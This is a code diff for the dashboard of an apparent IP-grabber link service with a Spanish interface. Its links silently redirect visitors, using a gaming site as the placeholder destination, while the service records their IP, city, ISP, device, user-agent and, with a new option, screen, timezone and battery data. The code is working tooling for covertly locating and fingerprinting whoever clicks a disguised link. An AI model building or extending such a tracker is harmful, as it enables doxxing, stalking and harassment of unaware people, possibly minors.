@@ -17,22 +17,26 @@
   .card h2{margin:0 0 14px;font-size:14px;color:var(--mut);text-transform:uppercase;letter-spacing:.6px}
   input{width:100%;padding:11px 13px;margin-bottom:10px;background:#0b0e13;border:1px solid var(--line);border-radius:9px;color:var(--txt);font-size:15px}
   input:focus{outline:none;border-color:var(--acc)}
+  input[type=checkbox]{width:auto;margin:0 8px 0 0;vertical-align:-2px}
+  label.chk{display:flex;align-items:flex-start;gap:8px;color:var(--mut);font-size:13px;margin:2px 0 12px;cursor:pointer}
   button{cursor:pointer;border:0;border-radius:9px;padding:11px 16px;font-size:14px;font-weight:600;background:var(--acc);color:#fff}
   button.mini{padding:6px 10px;font-size:12.5px;background:#1d2431;color:var(--txt)}
   button.danger{background:#2a1a1f;color:#ff9b9b}
   .row{display:flex;gap:8px;align-items:center;flex-wrap:wrap}
-  .link-item{display:flex;justify-content:space-between;gap:12px;padding:13px 0;border-top:1px solid var(--line);flex-wrap:wrap}
+  .link-item{padding:13px 0;border-top:1px solid var(--line)}
   .link-item:first-child{border-top:0}
+  .head{display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap}
   .dest{font-weight:600;word-break:break-all}
   .short{color:var(--acc);font-family:ui-monospace,Menlo,monospace;font-size:13px;word-break:break-all}
   .meta{color:var(--mut);font-size:12.5px}
   .pill{background:#12203a;color:#8fb6ff;border-radius:20px;padding:3px 10px;font-size:12.5px;font-weight:600}
   .big-link{font-family:ui-monospace,Menlo,monospace;background:#0b0e13;border:1px dashed var(--line);border-radius:9px;padding:12px;word-break:break-all;color:var(--acc)}
-  .visit{border-top:1px solid var(--line);padding:12px 0;font-size:13.5px}
-  table{width:100%;border-collapse:collapse;font-size:13.5px}td{padding:4px 0;vertical-align:top}td:first-child{color:var(--mut);width:120px}
+  .visits{background:#0b0e13;border:1px solid var(--line);border-radius:9px;padding:12px;margin-top:12px}
+  .visit{border-top:1px solid var(--line);padding:10px 0;font-size:13.5px}
+  .visit:first-child{border-top:0}
+  table{width:100%;border-collapse:collapse;font-size:13.5px}td{padding:3px 0;vertical-align:top}td:first-child{color:var(--mut);width:140px}
   .empty{color:var(--mut);font-size:13.5px}
-  #stats{position:fixed;inset:0;background:rgba(6,8,12,.8);display:none;padding:20px;overflow:auto;z-index:50}
-  #stats.on{display:block}#stats .card{max-width:820px;margin:20px auto}.close{float:right}
+  .err{color:#ff9b9b;font-size:13px}
 </style>
 </head>
 <body>
@@ -45,6 +49,8 @@
     <h2>Nuevo enlace</h2>
     <input id="dest" placeholder="https://roblox.com" autocomplete="off">
     <input id="label" placeholder="Etiqueta (opcional)" autocomplete="off">
+    <label class="chk"><input type="checkbox" id="client">
+      Capturar también datos del navegador (pantalla, zona horaria, batería). Añade ~0,3 s a la redirección.</label>
     <button id="create">Crear enlace</button>
     <div id="result"></div>
   </section>
@@ -53,82 +59,126 @@
     <div id="list"><div class="empty">Todavía no has creado enlaces.</div></div>
   </section>
 </main>
-<div id="stats"><div class="card">
-  <button class="close mini" id="closeStats">Cerrar</button>
-  <h2 id="statsTitle">Visitas</h2><div id="statsBody"></div>
-</div></div>
 <script>
 const $ = s => document.querySelector(s);
-const api = (p, o) => fetch(p, o).then(r => r.json());
 const esc = s => String(s == null ? '' : s).replace(/[&<>"]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
 let BASE = localStorage.getItem('lt_base') || '';
 const shortUrl = c => BASE.replace(/\/+$/, '') + '/' + c;
+const openCodes = new Set();
+let lastJSON = '';
 
+async function api(p, o){
+  const r = await fetch(p, o);
+  let d = null; try { d = await r.json(); } catch (_) {}
+  if (!r.ok) throw new Error((d && d.error) || ('HTTP ' + r.status));
+  return d;
+}
 function copy(t, b){ navigator.clipboard.writeText(t).then(() => { const o = b.textContent; b.textContent = '¡Copiado!'; setTimeout(() => b.textContent = o, 1200); }); }
+
+function rowHTML(l){
+  const u = shortUrl(l.code);
+  return '<div class="link-item"><div class="head"><div>' +
+    '<div class="dest">' + esc(l.label || l.dest) + (l.client ? ' <span class="pill">navegador</span>' : '') + '</div>' +
+    '<div class="short">' + u + '</div>' +
+    '<div class="meta">' + esc(l.dest) + ' · ' + new Date(l.created).toLocaleString() + '</div></div>' +
+    '<div class="row"><span class="pill">' + l.clicks + ' click' + (l.clicks === 1 ? '' : 's') + '</span>' +
+    '<button class="mini" onclick="copy(\'' + u + '\',this)">Copiar</button>' +
+    '<button class="mini" data-code="' + l.code + '" onclick="openStats(\'' + l.code + '\',this)">Ver</button>' +
+    '<button class="mini danger" onclick="del(\'' + l.code + '\')">Borrar</button></div></div>' +
+    '<div class="visits" id="v-' + l.code + '" hidden></div></div>';
+}
+
+async function load(){
+  let links;
+  try { links = await api('/api/links'); }
+  catch (e) { $('#list').innerHTML = '<div class="err">Error: ' + esc(e.message) + '</div>'; return; }
+  const j = JSON.stringify(links);
+  if (j === lastJSON) return;
+  lastJSON = j;
+  $('#count').textContent = links.length ? '(' + links.length + ')' : '';
+  $('#list').innerHTML = links.length ? links.map(rowHTML).join('')
+    : '<div class="empty">Todavía no has creado enlaces.</div>';
+  for (const code of openCodes){
+    const box = document.getElementById('v-' + code);
+    const btn = document.querySelector('button[data-code="' + code + '"]');
+    if (box){ box.hidden = false; if (btn) btn.textContent = 'Ocultar'; fill(box, code); }
+  }
+}
 
 async function createLink(){
   const dest = $('#dest').value.trim();
   if (!dest) return $('#dest').focus();
-  const r = await api('/api/links', { method:'POST', headers:{'Content-Type':'application/json'},
-    body: JSON.stringify({ dest, label: $('#label').value.trim() }) });
-  if (r.error) return alert(r.error);
-  const u = shortUrl(r.code);
-  $('#result').innerHTML = '<div class="big-link">' + u + '</div>' +
-    '<div class="row" style="margin-top:10px"><button class="mini" onclick="copy(\'' + u + '\',this)">Copiar</button>' +
-    '<span class="meta">Quien lo abra va al destino al instante y su info aparece abajo.</span></div>';
-  $('#dest').value = ''; $('#label').value = ''; load();
+  try {
+    const r = await api('/api/links', { method:'POST', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({ dest, label: $('#label').value.trim(), client: $('#client').checked }) });
+    const u = shortUrl(r.code);
+    $('#result').innerHTML = '<div class="big-link">' + u + '</div>' +
+      '<div class="row" style="margin-top:10px"><button class="mini" onclick="copy(\'' + u + '\',this)">Copiar</button>' +
+      '<span class="meta">Quien lo abra va al destino y su info aparece abajo.</span></div>';
+    $('#dest').value = ''; $('#label').value = ''; $('#client').checked = false;
+    lastJSON = ''; load();
+  } catch (e) { $('#result').innerHTML = '<div class="err">Error: ' + esc(e.message) + '</div>'; }
 }
 
-async function load(){
-  const links = await api('/api/links');
-  $('#count').textContent = links.length ? '(' + links.length + ')' : '';
-  if (!links.length) return $('#list').innerHTML = '<div class="empty">Todavía no has creado enlaces.</div>';
-  $('#list').innerHTML = links.map(l => {
-    const u = shortUrl(l.code);
-    return '<div class="link-item"><div><div class="dest">' + esc(l.label || l.dest) + '</div>' +
-      '<div class="short">' + u + '</div><div class="meta">' + esc(l.dest) + ' · ' + new Date(l.created).toLocaleString() + '</div></div>' +
-      '<div class="row"><span class="pill">' + l.clicks + ' click' + (l.clicks === 1 ? '' : 's') + '</span>' +
-      '<button class="mini" onclick="copy(\'' + u + '\',this)">Copiar</button>' +
-      '<button class="mini" onclick="stats(\'' + l.code + '\')">Ver</button>' +
-      '<button class="mini danger" onclick="del(\'' + l.code + '\')">Borrar</button></div></div>';
-  }).join('');
+async function del(c){
+  if (!confirm('¿Borrar este enlace?')) return;
+  try { await api('/api/links/' + c, { method:'DELETE' }); openCodes.delete(c); lastJSON = ''; load(); }
+  catch (e) { alert('Error: ' + e.message); }
 }
 
-async function del(c){ if (!confirm('¿Borrar este enlace?')) return; await api('/api/links/' + c, { method:'DELETE' }); load(); }
+async function openStats(code, btn){
+  const box = document.getElementById('v-' + code);
+  if (!box) return;
+  if (!box.hidden){ box.hidden = true; btn.textContent = 'Ver'; openCodes.delete(code); return; }
+  box.hidden = false; btn.textContent = 'Ocultar'; openCodes.add(code);
+  await fill(box, code);
+}
 
-async function stats(c){
-  const l = await api('/api/links/' + c);
-  $('#statsTitle').textContent = 'Visitas · ' + (l.label || l.dest);
-  if (!l.visits.length) $('#statsBody').innerHTML = '<div class="empty">Nadie lo ha abierto todavía.</div>';
-  else $('#statsBody').innerHTML = l.visits.map(v => {
-    const g = v.geo || {};
-    const loc = [g.city, g.region, g.country].filter(Boolean).join(', ') || 'Desconocida';
-    return '<div class="visit"><table>' +
-      '<tr><td>IP</td><td><b>' + esc(v.ip) + '</b></td></tr>' +
-      '<tr><td>Ubicación</td><td>' + esc(loc) + (g.cc ? ' (' + esc(g.cc) + ')' : '') + '</td></tr>' +
-      '<tr><td>ISP</td><td>' + esc(g.isp || g.org || '—') + '</td></tr>' +
-      (g.asn ? '<tr><td>ASN</td><td>' + esc(g.asn) + '</td></tr>' : '') +
-      '<tr><td>Horario</td><td>' + esc(g.timezone || '—') + '</td></tr>' +
-      '<tr><td>Dispositivo</td><td>' + esc(v.device) + ' · ' + esc(v.os) + ' · ' + esc(v.browser) + '</td></tr>' +
-      '<tr><td>Idioma</td><td>' + esc(v.lang || '—') + '</td></tr>' +
-      '<tr><td>Referer</td><td>' + esc(v.ref || 'directo') + '</td></tr>' +
-      '<tr><td>User-Agent</td><td>' + esc(v.ua) + '</td></tr>' +
-      '<tr><td>Fecha</td><td>' + new Date(v.time).toLocaleString() + '</td></tr>' +
-      '</table></div>';
-  }).join('');
-  $('#stats').classList.add('on');
+function visitHTML(v){
+  const g = v.geo || {};
+  const loc = [g.city, g.region, g.country].filter(Boolean).join(', ') || 'Desconocida';
+  let extra = '';
+  if (v.client){
+    const c = v.client;
+    extra =
+      (c.pantalla ? '<tr><td>Pantalla</td><td>' + esc(c.pantalla) + ' · dpr ' + esc(c.dpr) + '</td></tr>' : '') +
+      (c.zonaHoraria ? '<tr><td>Zona horaria (disp.)</td><td>' + esc(c.zonaHoraria) + '</td></tr>' : '') +
+      (c.bateria ? '<tr><td>Batería</td><td>' + esc(c.bateria) + (c.cargando ? ' (cargando)' : '') + '</td></tr>' : '') +
+      (c.nucleos ? '<tr><td>Núcleos CPU</td><td>' + esc(c.nucleos) + '</td></tr>' : '') +
+      (c.tactil != null ? '<tr><td>Táctil</td><td>' + (c.tactil ? 'sí' : 'no') + '</td></tr>' : '') +
+      (c.idiomaNavegador ? '<tr><td>Idioma navegador</td><td>' + esc(c.idiomaNavegador) + '</td></tr>' : '');
+  }
+  return '<div class="visit"><table>' +
+    '<tr><td>IP</td><td><b>' + esc(v.ip) + '</b></td></tr>' +
+    '<tr><td>Ubicación</td><td>' + esc(loc) + (g.cc ? ' (' + esc(g.cc) + ')' : '') + '</td></tr>' +
+    '<tr><td>ISP</td><td>' + esc(g.isp || g.org || '—') + '</td></tr>' +
+    (g.asn ? '<tr><td>ASN</td><td>' + esc(g.asn) + '</td></tr>' : '') +
+    '<tr><td>Horario</td><td>' + esc(g.timezone || '—') + '</td></tr>' +
+    '<tr><td>Dispositivo</td><td>' + esc(v.device) + ' · ' + esc(v.os) + ' · ' + esc(v.browser) + '</td></tr>' +
+    '<tr><td>Idioma</td><td>' + esc(v.lang || '—') + '</td></tr>' +
+    '<tr><td>Referer</td><td>' + esc(v.ref || 'directo') + '</td></tr>' +
+    extra +
+    '<tr><td>User-Agent</td><td>' + esc(v.ua) + '</td></tr>' +
+    '<tr><td>Fecha</td><td>' + new Date(v.time).toLocaleString() + '</td></tr>' +
+    '</table></div>';
+}
+
+async function fill(box, code){
+  box.innerHTML = '<div class="empty">Cargando…</div>';
+  try {
+    const l = await api('/api/links/' + code);
+    const vs = l.visits || [];
+    box.innerHTML = vs.length ? vs.map(visitHTML).join('')
+      : '<div class="empty">Nadie lo ha abierto todavía.</div>';
+  } catch (e) { box.innerHTML = '<div class="err">Error: ' + esc(e.message) + '</div>'; }
 }
 
 $('#create').onclick = createLink;
 $('#dest').addEventListener('keydown', e => { if (e.key === 'Enter') createLink(); });
-$('#base').addEventListener('change', e => { BASE = e.target.value.trim(); localStorage.setItem('lt_base', BASE); load(); });
-$('#closeStats').onclick = () => $('#stats').classList.remove('on');
-$('#stats').onclick = e => { if (e.target.id === 'stats') $('#stats').classList.remove('on'); };
+$('#base').addEventListener('change', e => { BASE = e.target.value.trim(); localStorage.setItem('lt_base', BASE); lastJSON = ''; load(); });
 
 (async () => {
-  const c = await api('/api/config');
-  if (!BASE) BASE = c.base;
-  $('#base').value = BASE;
+  try { const c = await api('/api/config'); if (!BASE) BASE = c.base; $('#base').value = BASE; } catch (_) {}
   load(); setInterval(load, 5000);
 })();
 </script>
